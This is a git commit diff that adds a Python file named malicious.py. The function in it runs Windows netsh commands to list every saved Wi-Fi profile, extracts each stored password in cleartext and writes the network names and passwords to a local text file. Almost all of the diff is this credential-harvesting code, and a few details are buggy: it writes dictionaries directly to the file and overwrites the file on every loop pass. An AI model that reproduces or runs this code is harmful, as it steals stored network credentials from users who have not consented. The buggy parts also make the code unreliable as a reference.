1f4428f3326ba0e7efc7c0d577c8088a8bda9f90
human intellectual structure <youkhakha197@gmail.com>
2023-03-20 18:29:17 +0300

    Updated malicious.py

--- source/malicious.py
+++ source/malicious.py
@@ -1,1 +1,41 @@
-0
+import subprocess
+import re
+import os
+__location__ = os.path.realpath(
+    os.path.join(os.getcwd(), os.path.dirname(__file__)))
+
+def wifigr():
+ command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
+ 
+ profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
+ 
+ wifi_list = []
+ 
+ if len(profile_names) != 0:
+     for name in profile_names:
+         try:
+ 
+             wifi_profile = {}
+ 
+             profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
+             if re.search("Security key           : Absent", profile_info):
+                 continue
+             else:
+                 wifi_profile["ssid"] = name
+                 profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode('utf-8')
+                 password = re.search("Key Content            : (.*)\r", profile_info_pass)
+ 
+                 if password == None:
+                     wifi_profile["password"] = None
+                 else:
+ 
+                     wifi_profile["password"] = password[1]
+                 wifi_list.append(wifi_profile) 
+         except Exception as e:
+             print(e)
+             pass
+ 
+ for x in range(len(wifi_list)):
+     #return wifi_list[x] 
+     with open(f"{__location__}/wifi_list.txt","w") as ff:
+         ff.write(wifi_list[x])
